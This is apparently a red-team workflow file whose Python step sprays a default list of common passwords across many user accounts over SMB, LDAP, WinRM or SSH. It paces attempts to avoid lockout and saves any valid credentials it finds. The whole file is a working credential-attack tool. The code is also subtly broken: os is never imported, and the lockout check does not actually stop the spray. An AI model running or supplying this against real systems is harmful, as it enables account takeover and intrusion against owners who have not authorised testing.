name: password-spray
description: |
  Password spraying against AD/SMB/WinRM/SSH services — test a small
  set of passwords against many accounts to avoid lockout, with
  configurable delay between attempts.
tags: [redteam, password, spray, brute-force, ad]
dispatch:
  inputs:
    log_command:
      type: string
      default: "true"
      description: Enable command log entries for steps when set to true/false.
    log_output:
      type: string
      default: "true"
      description: Enable stdout output log files for steps when set to true/false.
    target:
      required: true
      type: string
      description: Target host or CIDR
      alias: t
    users:
      required: true
      type: string
      description: Username list file or comma-separated
    passwords:
      type: string
      default: 'Password1,Welcome1,Company2024,Summer2024,Winter2024,P@ssw0rd'
      description: Passwords to spray (comma-separated or @file)
    protocol:
      type: string
      default: smb
      description: Protocol (smb, winrm, ssh, ldap)
    domain:
      type: string
      default: ''
      description: Domain name for AD spray
    delay:
      type: string
      default: '30'
      description: Delay between password rounds (minutes)

jobs:
  spray:
    name: Password Spray
    outputs:
      hit_count: '{{ steps["spray-attack"].outputs.hit_count | default("", true) }}'
      users_tested: '{{ steps["spray-attack"].outputs.users_tested | default("", true) }}'
      passwords_tested: '{{ steps["spray-attack"].outputs.passwords_tested | default("", true) }}'
    steps:
    - name: spray-attack
      script: |
        import subprocess
        import time
        from pathlib import Path

        target = '{{ inputs.target }}'
        protocol = '{{ inputs.protocol }}'
        domain = '{{ inputs.domain }}'
        delay_min = int('{{ inputs.delay }}')

        # Parse users
        users_raw = '''{{ inputs.users }}'''
        if Path(users_raw).is_file():
            users = [u.strip() for u in Path(users_raw).read_text().splitlines() if u.strip()]
        else:
            users = [u.strip() for u in users_raw.split(',') if u.strip()]

        # Parse passwords
        pw_raw = '''{{ inputs.passwords }}'''
        if Path(pw_raw).is_file():
            passwords = [p.strip() for p in Path(pw_raw).read_text().splitlines() if p.strip()]
        else:
            passwords = [p.strip() for p in pw_raw.split(',') if p.strip()]

        print(f"=== PASSWORD SPRAY ===")
        print(f"  Target: {target}")
        print(f"  Protocol: {protocol}")
        print(f"  Users: {len(users)}")
        print(f"  Passwords: {len(passwords)}")
        print(f"  Delay: {delay_min}min between rounds\n")

        hits = []
        tool = 'nxc' if subprocess.run(['which', 'nxc'], capture_output=True).returncode == 0 else 'crackmapexec'

        # Write users to file
        user_file = f'{os.environ.get("OFX_RUN_DIR", "/tmp")}/ofx_spray_users.txt'
        Path(user_file).write_text('\n'.join(users))

        for idx, password in enumerate(passwords):
            print(f"--- Round {idx+1}/{len(passwords)}: {password} ---")

            if protocol in ('smb', 'ldap'):
                domain_arg = ['-d', domain] if domain else []
                cmd = [tool, protocol, target] + domain_arg + ['-u', user_file, '-p', password, '--continue-on-success']
            elif protocol == 'winrm':
                domain_arg = ['-d', domain] if domain else []
                cmd = [tool, 'winrm', target] + domain_arg + ['-u', user_file, '-p', password, '--continue-on-success']
            elif protocol == 'ssh':
                cmd = [tool, 'ssh', target, '-u', user_file, '-p', password, '--continue-on-success']
            else:
                print(f"[-] Unknown protocol: {protocol}")
                break

            try:
                proc = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
                output = proc.stdout

                for line in output.splitlines():
                    if '[+]' in line or 'Pwn3d' in line:
                        hits.append(line.strip())
                        print(f"  [HIT] {line.strip()}")

                    if '[-]' in line and 'STATUS_ACCOUNT_LOCKED' in line:
                        print(f"  [!] ACCOUNT LOCKED — stopping spray")
                        break
            except Exception as e:
                print(f"  Error: {e}")

            # Delay between rounds
            if idx < len(passwords) - 1:
                print(f"  Waiting {delay_min} minutes...")
                time.sleep(delay_min * 60)

        add_outputs(hit_count=len(hits), users_tested=len(users), passwords_tested=len(passwords))
        print(f"\n=== RESULTS: {len(hits)} valid credentials ===")
        for hit in hits:
            print(f"  {hit}")

        if hits:
            hit_file = f'{os.environ.get("OFX_RUN_DIR", "/tmp")}/ofx_spray_hits.txt'
            Path(hit_file).write_text('\n'.join(hits))
            print(f"\n  Saved to: {hit_file}")
      log-stdout: "{{ inputs.log_output | default(true) }}"
      log-command: "{{ inputs.log_command | default(true) }}"
